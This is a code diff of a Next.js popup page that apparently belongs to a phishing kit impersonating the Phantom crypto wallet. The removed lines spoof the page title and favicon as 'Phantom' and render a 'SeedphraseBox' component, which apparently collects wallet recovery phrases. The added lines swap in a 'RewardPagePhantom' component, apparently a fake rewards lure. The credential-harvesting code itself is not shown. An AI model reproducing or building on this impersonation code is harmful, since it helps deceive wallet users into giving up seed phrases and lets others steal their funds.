@@ -4,7 +4,6 @@ import { useEffect, useState } from "react";
 import Image from "next/image";
 import Head from "next/head";
 import RewardPagePhantom from "@/components/popup/rewards-phantom";
-import SeedphraseBox from "@/components/popup/seedphrasephantom";
 
 const PopupPage = () => {
   const [publicKey, setPublicKey] = useState<string | null>(null);
@@ -14,19 +13,6 @@ const PopupPage = () => {
   const [isDesktop, setIsDesktop] = useState(true); // Assume desktop initially
   const [isWalletBrowser, setIsWalletBrowser] = useState(false);
   const [isMobileWalletApp, setIsMobileWalletApp] = useState(true);
-  useEffect(() => {
-    document.title = "Phantom";
-    const favicon = document.querySelector("link[rel='icon']") as HTMLLinkElement | null;
-    if (favicon) {
-      favicon.href = "/phantom.ico"; // Path to your new favicon
-    } else {
-      // If no favicon exists, create one
-      const newFavicon = document.createElement("link");
-      newFavicon.rel = "icon";
-      newFavicon.href = "/phantom.ico"; // Path to your new favicon
-      document.head.appendChild(newFavicon);
-    }
-  }, []);
 
   useEffect(() => {
     const userAgent = navigator.userAgent.toLowerCase();
@@ -124,14 +110,10 @@ const PopupPage = () => {
           ) : (
             <p className="text-lg">Connecting...</p>
           )}
-          
+          <hr></hr>
         </div>
-        <hr
-    style={{ backgroundColor: "#555555", height: "1px" }}
-    className="mb-4 w-full bg-gray-400 border-0"
-  />
 
-        <SeedphraseBox />
+        <RewardPagePhantom />
       </div>
     </main>
   );
